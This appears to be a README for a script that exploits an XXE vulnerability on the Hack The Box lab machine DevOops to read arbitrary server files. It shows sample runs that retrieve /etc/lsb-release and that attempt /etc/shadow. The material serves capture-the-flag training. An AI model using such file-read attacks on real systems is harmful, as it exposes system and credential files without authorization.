## Challenge

[DevOops](https://www.hackthebox.eu/home/machines/profile/140) from Hackthebox.eu

## Description

Abuses a XXE vulnerability in the webserver to allow for file read. Use can provide a path and the script will attempt to retrieve that file and display it.

## Reference

Originally published in blog post: https://0xdf.gitlab.io/2018/10/13/htb-devoops.html#better-automation-python-script

## Usage

```
root@kali:~/hackthebox/devoops-10.10.10.91# ./devoops_get.py /etc/lsb-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.4 LTS"

root@kali:~/hackthebox/devoops-10.10.10.91# ./devoops_get.py /etc/shadow
[-] Unable to connect. Either site is down or file doesn't exist or can't be read by current user.
```
